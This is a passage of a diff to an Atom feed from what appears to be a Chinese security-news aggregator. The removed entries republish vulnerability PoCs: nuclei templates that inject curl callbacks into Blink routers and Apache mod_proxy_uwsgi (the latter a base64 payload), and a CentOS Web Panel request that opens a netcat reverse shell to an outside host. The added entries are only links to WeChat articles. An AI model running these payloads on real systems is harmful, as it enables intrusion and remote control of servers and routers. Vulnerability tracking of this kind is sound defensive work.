class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-45985</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Blink Router - Command Injection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">darses</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Blink routers BL-WR9000 V2.4.9 , BL-AC2100_AZ3 V1.0.4, BL-X10_AC8 v1.0.5 , BL-LTE300 v1.2.3, BL-F1200_AT1 v1.0.0, BL-X26_AC8 v1.2.8, BLAC450M_AE4 v4.0.0 and BL-X26_DA3 v1.2.7 were discovered to contain a command injection vulnerability via the bs_SetSSIDHide function.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/glkfc/IoT-Vulnerability/blob/main/LB-LINK/LB-LINK_enable%20Unauthorized%20command%20injection/LB-LINK_enable%20command%20injection.md</span><br>  <span class="hljs-attribute">classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2025-45985</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-77</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.00386</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.58893</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>    <span class="hljs-attribute">fofa-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">title=&quot;B-LINK&quot;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2025,b-link,rce,router</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        <span class="hljs-attribute">POST /goform/set_hidessid_cfg HTTP/1.1</span><br><span class="hljs-attribute">        Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">:</span> <span class="hljs-string">XMLHttpRequest</span><br>        <span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json, text/javascript, */*; q=0.01</span><br>        <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded; charset=UTF-8</span><br>        <span class="hljs-attribute">Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;RootURL&#125;&#125;</span><br>        <span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;[RootURL]&#125;/admin/more.html</span><br>        <span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">platform=0; user=admin</span><br><br>        <span class="hljs-attribute">type=sethide2&amp;enable=&quot;;curl &#123;&#123;interactsh-url&#125;&#125;;&quot;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;type&quot;:&#x27;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;result&quot;:&#x27;</span><br>        <span class="hljs-attribute">condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">interactsh_protocol # Confirms the DNS Interaction</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;dns&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2hM0zltRB_s2R8eY1n4kSA">https://mp.weixin.qq.com/s/2hM0zltRB_s2R8eY1n4kSA</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Blink Router 命令注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/2hM0zltRB_s2R8eY1n4kSA&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>Apache HTTP Server 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/24/github_3376454156/"/>
-    <id>http://example.com/2025/06/24/github_3376454156/</id>
-    <published>2025-06-24T17:15:27.329Z</published>
-    <updated>2025-06-24T17:15:27.326Z</updated>
+    <title>美国保险巨头 Aflac 称客户数据在网络攻击中被盗</title>
+    <link href="http://example.com/2025/06/25/weixin_2954203223/"/>
+    <id>http://example.com/2025/06/25/weixin_2954203223/</id>
+    <published>2025-06-25T05:17:58.864Z</published>
+    <updated>2025-06-25T05:17:58.862Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-11984</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露及可能的远程代码执行漏洞，远程攻击者通过发送精心构造的请求，可以访问敏感信息并可能执行任意代码。</p><p><strong>产品厂商：</strong> apache</p><p><strong>产品名称：</strong> http_server</p><p><strong>影响版本：</strong> 2.4.32 &lt;&#x3D; version &lt;&#x3D; 2.4.44</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:a:apache:http_server”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c88d9d77ccad17c4c44ada038651dd098b3bd2d5/code%2Fcves%2F2020%2FCVE-2020-11984.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c88d9d77ccad17c4c44ada038651dd098b3bd2d5/code%2Fcves%2F2020%2FCVE-2020-11984.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">11984</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Apache HTTP Server <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> wofeiwo@<span class="hljs-number">80</span>sec.com,pszyszkowski,pdresearch,iamnoooob<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Apache HTTP Server <span class="hljs-number">2.4</span>.<span class="hljs-number">32</span> to <span class="hljs-number">2.4</span>.<span class="hljs-number">44</span> contains an info disclosure and possible remote code execution caused by a vulnerability <span class="hljs-keyword">in</span> mod_proxy_uwsgi, letting remote attackers access sensitive information and potentially execute arbitrary code, exploit requires sending crafted requests.<br>  <span class="hljs-params">remediation:</span> |<br>    Update to <span class="hljs-operator">&gt;=</span> <span class="hljs-number">2.4</span>.<span class="hljs-number">45</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/RubenBar/MLW-upcrans/tree/main/1.Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/cve-2020-11984</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">11984</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">120</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> apache<br>    <span class="hljs-params">product:</span> http_server<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:a:apache:http_server&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,apache,httpd,rce<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">oast:</span> <span class="hljs-string">&quot;.&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br>  <span class="hljs-params">payload:</span> <span class="hljs-string">&quot;&#123;&#123;padding(oast,&#x27;a&#x27;,54,&#x27;prefix&#x27;)&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        &#123;&#123;replace(base64_decode(&#x27;AHIAAAoAVVdTR0lfRklMRUsAZXhlYzovL2N1cmwgYWFhYWFhYWEuZmw0NGhoY240NHEydWtsdjI5YnB6dTR1amxwY2QzM3JzLm9hc3RpZnkuY29tOyBlY2hvICIiCwBTQ1JJUFRfTkFNRQoAL3BlbmV0cmF0ZQ<span class="hljs-operator">==</span>&#x27;),&#x27;aaaaaaaa.fl44hhcn44q2uklv29bpzu4ujlpcd33rs.oastify.com&#x27;,payload)&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains(interactsh_protocol, <span class="hljs-string">&quot;http&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(interactsh_request, <span class="hljs-string">&quot;User-Agent: curl&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/W4AEcE0y-wp-R1v7OpRQWg">https://mp.weixin.qq.com/s/W4AEcE0y-wp-R1v7OpRQWg</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache HTTP Server 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/W4AEcE0y-wp-R1v7OpRQWg&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>BeyondTrust Remote Support and Privileged Remote Access Server-Side Template Injection Vulnerability</title>
-    <link href="http://example.com/2025/06/24/github_1690674084/"/>
-    <id>http://example.com/2025/06/24/github_1690674084/</id>
-    <published>2025-06-24T17:15:15.028Z</published>
-    <updated>2025-06-24T17:15:15.026Z</updated>
+    <title>曹县黑客利用社会工程学诱骗 Zoom 会议参与者执行系统接管命令</title>
+    <link href="http://example.com/2025/06/25/weixin_2836322117/"/>
+    <id>http://example.com/2025/06/25/weixin_2836322117/</id>
+    <published>2025-06-25T05:17:58.536Z</published>
+    <updated>2025-06-25T05:17:58.534Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> BeyondTrust Remote Support and Privileged Remote Access Server-Side Template Injection Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5309</li></ul><p><strong>漏洞类型：</strong> 服务端模板注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> BeyondTrust Remote Support和Privileged Remote Access中的聊天功能存在服务端模板注入漏洞，可能导致远程代码执行。</p><p><strong>产品厂商：</strong> BeyondTrust</p><p><strong>产品名称：</strong> BeyondTrust Remote Support, BeyondTrust Privileged Remote Access</p><p><strong>搜索语法：</strong> product.name&#x3D;”BeyondTrust Remote Support”||product.name&#x3D;”BeyondTrust Privileged Remote Access”</p><p><strong>来源：</strong> <a href="https://github.com/issamjr/CVE-2025-5309-Scanner">https://github.com/issamjr/CVE-2025-5309-Scanner</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>requirements.txt</li><li>scanner.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-5309-Scanner"><a href="#CVE-2025-5309-Scanner" class="headerlink" title="CVE-2025-5309 Scanner"></a>CVE-2025-5309 Scanner</h2><p>🚨 <strong>CVE-2025-5309</strong>: Server-Side Template Injection in Remote Support and Privileged Remote Access Chat Feature</p><h3 id="📰-CVE-Overview"><a href="#📰-CVE-Overview" class="headerlink" title="📰 CVE Overview"></a>📰 CVE Overview</h3><p>A vulnerability in BeyondTrust Remote Support and Privileged Remote Access allows Server-Side Template Injection (SSTI), potentially leading to remote code execution via the chat feature.</p><ul><li><strong>CVE</strong>: CVE-2025-5309</li><li><strong>Risk</strong>: High (Remote Code Execution)</li><li><strong>Credit</strong>: Jorren Geurts – <a href="https://resillion.com/latest-news/be">resillion.com</a></li><li><strong>Searchable Services</strong>: Over 1.2M services found on <a href="https://hunter.how/list?searchVal=BeyondTrust">hunter.how</a></li><li><strong>Query</strong>:<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">product</span>.<span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;BeyondTrust Remote Support&quot;</span>||<span class="hljs-built_in">product</span>.<span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;BeyondTrust Privileged Remote Access&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="🛡️-How-to-Fix"><a href="#🛡️-How-to-Fix" class="headerlink" title="🛡️ How to Fix"></a>🛡️ How to Fix</h3><ul><li>Update to the latest secure version from <a href="https://beyondtrust.com/trust-center/security-advisories">BeyondTrust</a></li><li>Disable or restrict public access to the chat system</li><li>Monitor and restrict template processing in chat input</li></ul><h3 id="🔍-Usage"><a href="#🔍-Usage" class="headerlink" title="🔍 Usage"></a>🔍 Usage</h3><p>Install dependencies:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install -r requirements.txt<br></code></pre></td></tr></table></figure><p>Run the scanner:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 scanner.py --query <span class="hljs-string">&quot;BeyondTrust&quot;</span><br></code></pre></td></tr></table></figure><h3 id="💡-Example-Output"><a href="#💡-Example-Output" class="headerlink" title="💡 Example Output"></a>💡 Example Output</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">🚨 CVE<span class="hljs-number">-2025</span><span class="hljs-number">-5309</span> <span class="hljs-keyword">Scanner </span><span class="hljs-keyword">by </span>Issam <span class="hljs-keyword">junior </span>🚨<br>[+] Searching for: <span class="hljs-keyword">BeyondTrust </span>...<br>[!] Possible vulnerable service found: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">55</span>:<span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h3 id="📌-Disclaimer"><a href="#📌-Disclaimer" class="headerlink" title="📌 Disclaimer"></a>📌 Disclaimer</h3><p>This tool is for <strong>educational and security research purposes only</strong>.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/8jTk3bI4tsZMt-2Nh6zu5w">https://mp.weixin.qq.com/s/8jTk3bI4tsZMt-2Nh6zu5w</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; BeyondTrust Remote Support and Privileg</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/8jTk3bI4tsZMt-2Nh6zu5w&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="服务端模板注入" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/24/github_1170031665/"/>
-    <id>http://example.com/2025/06/24/github_1170031665/</id>
-    <published>2025-06-24T16:45:33.115Z</published>
-    <updated>2025-06-24T16:45:33.116Z</updated>
+    <title>运行 Linux 的 SOHO 设备中发现隐秘后门</title>
+    <link href="http://example.com/2025/06/25/weixin_3023777475/"/>
+    <id>http://example.com/2025/06/25/weixin_3023777475/</id>
+    <published>2025-06-25T05:17:58.194Z</published>
+    <updated>2025-06-25T05:17:58.190Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可以通过构造特定的请求在无需认证的情况下执行任意命令，导致服务器被完全控制。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/LfS45hHTHPRP2sSEy-DPqg">https://mp.weixin.qq.com/s/LfS45hHTHPRP2sSEy-DPqg</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;st</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/LfS45hHTHPRP2sSEy-DPqg&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>CVE-2025-49144</title>
-    <link href="http://example.com/2025/06/24/github_600257760/"/>
-    <id>http://example.com/2025/06/24/github_600257760/</id>
-    <published>2025-06-24T16:45:23.811Z</published>
-    <updated>2025-06-24T16:45:23.808Z</updated>
+    <title>黑客攻击超过 70 台 Exchange 服务器</title>
+    <link href="http://example.com/2025/06/25/weixin_2056373385/"/>
+    <id>http://example.com/2025/06/25/weixin_2056373385/</id>
+    <published>2025-06-25T05:17:57.865Z</published>
+    <updated>2025-06-25T05:17:57.862Z</updated>
     
